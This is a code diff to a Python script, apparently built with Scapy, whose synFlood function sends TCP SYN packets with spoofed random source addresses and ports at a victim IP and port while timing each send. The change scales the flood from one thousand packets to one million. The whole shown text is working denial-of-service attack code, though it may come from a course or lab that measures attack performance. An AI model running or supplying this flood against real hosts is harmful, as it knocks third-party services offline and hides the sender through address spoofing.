@@ -20,26 +20,29 @@ def randomPort():
 
 def synFlood(victim_ip, victim_port):
     f = open('syns_results_p.txt', 'a')
+    counter = 0
     start_all = time.time()
 
-    for packet in range(1000):
-        start_one = time.time()
-        IP_Packet = IP()
-        IP_Packet.src = randomIP()
-        IP_Packet.dst = victim_ip
+    for i in range(100):
+        for packet in range(10000):
+            start_one = time.time()
+            IP_Packet = IP()
+            IP_Packet.src = randomIP()
+            IP_Packet.dst = victim_ip
 
-        TCP_Packet = TCP()
-        TCP_Packet.sport = randomPort()
-        TCP_Packet.dport = victim_port
+            TCP_Packet = TCP()
+            TCP_Packet.sport = randomPort()
+            TCP_Packet.dport = victim_port
 
-        pkt = IP_Packet / TCP_Packet
-        send(pkt)
-        end_one = time.time()
-        f.write(f'{packet}->{round((end_one - start_one), 5)}\n')
+            pkt = IP_Packet / TCP_Packet
+            send(pkt)
+            end_one = time.time()
+            f.write(f'{counter}->{round((end_one - start_one), 5)}\n')
+            counter += 1
 
     end_all = time.time()
     f.write(f'total->{round((end_all - start_all), 5)}\n')
-    avg = round(((end_all - start_all) / 1000), 5)
+    avg = round(((end_all - start_all) / 1000000), 5)
     f.write(f'avg->{avg}')
     f.close()
 
